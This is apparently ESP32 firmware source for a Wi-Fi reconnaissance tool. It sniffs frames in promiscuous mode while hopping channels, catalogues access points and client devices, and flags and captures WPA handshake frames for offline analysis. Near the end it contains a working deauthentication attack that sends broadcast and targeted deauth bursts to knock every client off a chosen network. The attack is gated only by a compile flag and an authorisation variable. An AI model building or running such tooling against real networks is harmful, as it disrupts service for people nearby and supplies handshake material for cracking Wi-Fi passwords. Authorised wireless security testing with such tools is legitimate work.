#include "rf_recon.h"
#include <esp_wifi.h>
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"

// Compact record handed from the Wi-Fi RX callback to the main loop.
struct RawFrame {
    uint8_t kind;       // 0 AP(beacon/probe-resp), 1 probe-req, 2 data, 3 EAPOL
    uint8_t bssid[6];
    uint8_t mac[6];     // station address
    int8_t  rssi;
    uint8_t channel;
    bool    secure;
    char    ssid[33];
};

static QueueHandle_t s_queue = nullptr;

static volatile bool s_captureEnabled = false;
static ReconCaptureSink s_captureSink = nullptr;

void rfReconSetCaptureSink(ReconCaptureSink sink) { s_captureSink = sink; }
void rfReconEnableCapture(bool enabled) { s_captureEnabled = enabled; }

static const uint8_t ZERO_MAC[6] = {0, 0, 0, 0, 0, 0};

static void macCopy(uint8_t* dst, const uint8_t* src) { memcpy(dst, src, 6); }
static bool macEq(const uint8_t* a, const uint8_t* b) { return memcmp(a, b, 6) == 0; }

// Pull an SSID tag (id 0) out of tagged parameters into a bounded C string.
static void extractSsid(const uint8_t* p, int len, int tagStart, char* out, size_t outLen) {
    out[0] = '\0';
    int i = tagStart;
    while (i + 2 <= len) {
        uint8_t id = p[i];
        uint8_t l = p[i + 1];
        if (i + 2 + l > len) break;
        if (id == 0) {  // SSID
            size_t n = l < (outLen - 1) ? l : (outLen - 1);
            size_t w = 0;
            for (size_t k = 0; k < n; k++) {
                uint8_t c = p[i + 2 + k];
                out[w++] = (c >= 32 && c < 127) ? (char)c : '.';
            }
            out[w] = '\0';
            return;
        }
        i += 2 + l;
    }
}

static void promiscCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_queue) return;
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* p = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    uint8_t fc = p[0];
    uint8_t ftype = (fc >> 2) & 0x3;
    uint8_t subtype = (fc >> 4) & 0xF;

    RawFrame f;
    memset(&f, 0, sizeof(f));
    f.rssi = pkt->rx_ctrl.rssi;
    f.channel = pkt->rx_ctrl.channel;

    if (ftype == 0) {  // management
        if (subtype == 8 || subtype == 5) {  // beacon / probe response
            macCopy(f.bssid, p + 16);
            uint16_t cap = (len >= 36) ? (p[34] | (p[35] << 8)) : 0;
            f.secure = (cap & 0x0010) != 0;
            if (len > 38) extractSsid(p, len, 36, f.ssid, sizeof(f.ssid));
            f.kind = 0;
        } else if (subtype == 4) {  // probe request
            macCopy(f.mac, p + 10);
            if (len > 26) extractSsid(p, len, 24, f.ssid, sizeof(f.ssid));
            f.kind = 1;
        } else {
            return;
        }
    } else if (ftype == 2) {  // data
        uint8_t flags = p[1];
        bool toDS = flags & 0x01;
        bool fromDS = flags & 0x02;
        if (toDS && fromDS) return;  // WDS — ignore

        if (!toDS && fromDS) { macCopy(f.mac, p + 4);  macCopy(f.bssid, p + 10); }
        else if (toDS && !fromDS) { macCopy(f.mac, p + 10); macCopy(f.bssid, p + 4); }
        else { macCopy(f.mac, p + 10); macCopy(f.bssid, p + 16); }

        f.kind = 2;
        int hdr = 24;
        if (subtype & 0x08) hdr += 2;  // QoS data carries a 2-byte QoS control
        if (len > hdr + 8 && p[hdr + 6] == 0x88 && p[hdr + 7] == 0x8E)
            f.kind = 3;  // EAPOL (handshake material)
    } else {
        return;
    }

    xQueueSend(s_queue, &f, 0);  // drop on overflow; main loop drains continuously

    // Capture frames useful for offline analysis: all management plus EAPOL.
    if (s_captureEnabled && s_captureSink) {
        bool want = (ftype == 0) || (ftype == 2 && f.kind == 3);
        if (want) s_captureSink(p, (uint16_t)len);
    }
}

void RfRecon::begin(bool keepAp) {
    if (_running) return;
    if (!s_queue) s_queue = xQueueCreate(48, sizeof(RawFrame));

    _apCount = _clientCount = _probeCount = 0;
    _frames = 0;
    memset(_aps, 0, sizeof(_aps));
    memset(_clients, 0, sizeof(_clients));

    WiFi.mode(keepAp ? WIFI_AP_STA : WIFI_STA);
    WiFi.disconnect(false, false);  // drop any association but keep the radio ON
    esp_wifi_start();               // ensure the Wi-Fi driver is running
    esp_wifi_set_promiscuous(false);

    wifi_promiscuous_filter_t filt = {};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&promiscCb);
    esp_wifi_set_promiscuous(true);

    _channel = 1;
    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    _running = true;
    _lastHop = _lastPrune = millis();
    Serial.println("[RECON] Promiscuous capture started (CH1-13 hop)");
}

void RfRecon::stop() {
    if (!_running) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    _running = false;
    Serial.println("[RECON] Capture stopped");
}

void RfRecon::loop() {
    if (!_running) return;
    drainQueue();

    unsigned long now = millis();
    if (now - _lastHop >= RECON_HOP_MS) {
        _lastHop = now;
        uint8_t ch = _channel + 1;
        if (ch > RECON_CHANNELS) ch = 1;
        _channel = ch;
        esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    }
    if (now - _lastPrune >= 5000) {
        _lastPrune = now;
        prune();
    }
}

void RfRecon::drainQueue() {
    RawFrame f;
    int budget = 64;  // bound work per loop for responsiveness
    while (budget-- > 0 && s_queue && xQueueReceive(s_queue, &f, 0) == pdTRUE) {
        _frames++;
        switch (f.kind) {
            case 0:
                upsertAp(f.bssid, f.ssid, f.rssi, f.channel, f.secure, true, false);
                break;
            case 1:
                upsertClient(f.mac, ZERO_MAC, f.rssi, f.ssid);
                break;
            case 2:
                if (!macEq(f.bssid, ZERO_MAC))
                    upsertAp(f.bssid, nullptr, f.rssi, f.channel, false, false, false);
                upsertClient(f.mac, f.bssid, f.rssi, nullptr);
                break;
            case 3:
                upsertAp(f.bssid, nullptr, f.rssi, f.channel, false, false, true);
                upsertClient(f.mac, f.bssid, f.rssi, nullptr);
                break;
        }
    }
    recountClients();
}

int RfRecon::findAp(const uint8_t bssid[6]) const {
    for (int i = 0; i < _apCount; i++)
        if (macEq(_aps[i].bssid, bssid)) return i;
    return -1;
}

int RfRecon::findClient(const uint8_t mac[6]) const {
    for (int i = 0; i < _clientCount; i++)
        if (macEq(_clients[i].mac, mac)) return i;
    return -1;
}

void RfRecon::upsertAp(const uint8_t bssid[6], const char* ssid, int8_t rssi,
                       uint8_t ch, bool secure, bool beacon, bool eapol) {
    if (macEq(bssid, ZERO_MAC)) return;
    int idx = findAp(bssid);
    if (idx < 0) {
        if (_apCount >= RECON_MAX_AP) {
            // replace the stalest entry
            idx = 0;
            for (int i = 1; i < _apCount; i++)
                if (_aps[i].lastSeen < _aps[idx].lastSeen) idx = i;
        } else {
            idx = _apCount++;
            memset(&_aps[idx], 0, sizeof(ReconAp));
        }
        macCopy(_aps[idx].bssid, bssid);
    }
    ReconAp& a = _aps[idx];
    a.rssi = rssi;
    if (ch) a.channel = ch;
    if (beacon) {
        a.beacons++;
        a.secure = secure;
        if (ssid && ssid[0]) strncpy(a.ssid, ssid, sizeof(a.ssid) - 1);
    } else if (ssid && ssid[0] && a.ssid[0] == '\0') {
        strncpy(a.ssid, ssid, sizeof(a.ssid) - 1);
    }
    if (eapol) a.handshake = true;
    a.lastSeen = millis();
}

void RfRecon::upsertClient(const uint8_t mac[6], const uint8_t bssid[6],
                           int8_t rssi, const char* probe) {
    if (macEq(mac, ZERO_MAC)) return;
    if (mac[0] & 0x01) return;  // multicast/broadcast source — not a station
    int idx = findClient(mac);
    if (idx < 0) {
        if (_clientCount >= RECON_MAX_CLIENT) {
            idx = 0;
            for (int i = 1; i < _clientCount; i++)
                if (_clients[i].lastSeen < _clients[idx].lastSeen) idx = i;
        } else {
            idx = _clientCount++;
            memset(&_clients[idx], 0, sizeof(ReconClient));
        }
        macCopy(_clients[idx].mac, mac);
    }
    ReconClient& c = _clients[idx];
    c.rssi = rssi;
    c.frames++;
    if (bssid && !macEq(bssid, ZERO_MAC)) macCopy(c.bssid, bssid);
    if (probe && probe[0] && !c.hasProbe) {
        strncpy(c.probe, probe, sizeof(c.probe) - 1);
        c.hasProbe = true;
    }
    c.lastSeen = millis();
}

void RfRecon::recountClients() {
    for (int i = 0; i < _apCount; i++) _aps[i].clients = 0;
    _probeCount = 0;
    for (int i = 0; i < _clientCount; i++) {
        if (_clients[i].hasProbe) _probeCount++;
        if (macEq(_clients[i].bssid, ZERO_MAC)) continue;
        int a = findAp(_clients[i].bssid);
        if (a >= 0 && _aps[a].clients < 255) _aps[a].clients++;
    }
}

void RfRecon::prune() {
    unsigned long now = millis();
    int w = 0;
    for (int i = 0; i < _apCount; i++)
        if (now - _aps[i].lastSeen < RECON_PRUNE_MS) _aps[w++] = _aps[i];
    _apCount = w;
    w = 0;
    for (int i = 0; i < _clientCount; i++)
        if (now - _clients[i].lastSeen < RECON_PRUNE_MS) _clients[w++] = _clients[i];
    _clientCount = w;
    recountClients();
}

int RfRecon::handshakeCount() const {
    int n = 0;
    for (int i = 0; i < _apCount; i++)
        if (_aps[i].handshake) n++;
    return n;
}

void RfRecon::buildSortedApIndex(uint8_t* order, int& n) const {
    n = _apCount;
    for (int i = 0; i < n; i++) order[i] = i;
    for (int i = 1; i < n; i++) {
        uint8_t key = order[i];
        int j = i - 1;
        while (j >= 0 && _aps[order[j]].rssi < _aps[key].rssi) {
            order[j + 1] = order[j];
            j--;
        }
        order[j + 1] = key;
    }
}

bool RfRecon::getApLine(int idx, char* buf, size_t len) const {
    uint8_t order[RECON_MAX_AP];
    int n = 0;
    buildSortedApIndex(order, n);
    if (idx < 0 || idx >= n) return false;
    const ReconAp& a = _aps[order[idx]];
    char name[15];
    if (a.ssid[0]) {
        strncpy(name, a.ssid, sizeof(name) - 1);
        name[sizeof(name) - 1] = '\0';
    } else {
        snprintf(name, sizeof(name), "<%02X%02X%02X>", a.bssid[3], a.bssid[4], a.bssid[5]);
    }
    snprintf(buf, len, "%-14s c%-2u %d %uc%s%s",
             name, (unsigned)a.channel, (int)a.rssi,
             (unsigned)a.clients, a.secure ? "" : " O", a.handshake ? " HS" : "");
    return true;
}

void RfRecon::toJsonAps(JsonDocument& doc) const {
    JsonArray arr = doc["aps"].to<JsonArray>();
    uint8_t order[RECON_MAX_AP];
    int n = 0;
    buildSortedApIndex(order, n);
    for (int i = 0; i < n; i++) {
        const ReconAp& a = _aps[order[i]];
        JsonObject o = arr.add<JsonObject>();
        char b[18];
        snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
                 a.bssid[0], a.bssid[1], a.bssid[2], a.bssid[3], a.bssid[4], a.bssid[5]);
        o["bssid"] = b;
        o["ssid"] = a.ssid;
        o["rssi"] = a.rssi;
        o["channel"] = a.channel;
        o["secure"] = a.secure;
        o["clients"] = a.clients;
        o["beacons"] = a.beacons;
        o["handshake"] = a.handshake;
    }
}

// Builds and transmits one 802.11 deauthentication frame.
static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* dest, uint16_t reason) {
    uint8_t f[26] = {
        0xC0, 0x00,              // frame control: mgmt / deauth
        0x00, 0x00,              // duration
        0, 0, 0, 0, 0, 0,        // addr1 = destination
        0, 0, 0, 0, 0, 0,        // addr2 = source (BSSID)
        0, 0, 0, 0, 0, 0,        // addr3 = BSSID
        0x00, 0x00,              // sequence
        0x00, 0x00               // reason code
    };
    memcpy(f + 4, dest, 6);
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
    f[24] = reason & 0xFF;
    f[25] = (reason >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
}

bool RfRecon::deauthSortedIndex(int idx, char* ssidOut, size_t len) {
#if !ENABLE_DEAUTH
    (void)idx; (void)ssidOut; (void)len;
    return false;
#else
    if (!_authorized || !_running) return false;
    uint8_t order[RECON_MAX_AP];
    int n = 0;
    buildSortedApIndex(order, n);
    if (idx < 0 || idx >= n) return false;

    ReconAp& a = _aps[order[idx]];
    if (ssidOut && len) {
        strncpy(ssidOut, a.ssid[0] ? a.ssid : "<hidden>", len - 1);
        ssidOut[len - 1] = '\0';
    }

    uint8_t ch = a.channel ? a.channel : _channel;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    static const uint8_t BROADCAST[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    int sent = 0;
    for (int i = 0; i < 12; i++) {  // broadcast: AP de-auths every client
        sendDeauthFrame(a.bssid, BROADCAST, 7);
        delay(1);
        sent++;
    }
    for (int c = 0; c < _clientCount; c++) {  // targeted to known stations
        if (!macEq(_clients[c].bssid, a.bssid)) continue;
        for (int i = 0; i < 4; i++) {
            sendDeauthFrame(a.bssid, _clients[c].mac, 7);
            delay(1);
            sent++;
        }
    }
    Serial.printf("[RECON] Deauth burst -> %s (ch%u, %d frames)\n",
                  a.ssid[0] ? a.ssid : "<hidden>", (unsigned)ch, sent);
    return true;
#endif
}

void RfRecon::toJsonClients(JsonDocument& doc) const {
    JsonArray arr = doc["clients"].to<JsonArray>();
    for (int i = 0; i < _clientCount; i++) {
        const ReconClient& c = _clients[i];
        JsonObject o = arr.add<JsonObject>();
        char m[18], b[18];
        snprintf(m, sizeof(m), "%02X:%02X:%02X:%02X:%02X:%02X",
                 c.mac[0], c.mac[1], c.mac[2], c.mac[3], c.mac[4], c.mac[5]);
        snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
                 c.bssid[0], c.bssid[1], c.bssid[2], c.bssid[3], c.bssid[4], c.bssid[5]);
        o["mac"] = m;
        o["bssid"] = b;
        o["rssi"] = c.rssi;
        o["frames"] = c.frames;
        if (c.hasProbe) o["probe"] = c.probe;
    }
}
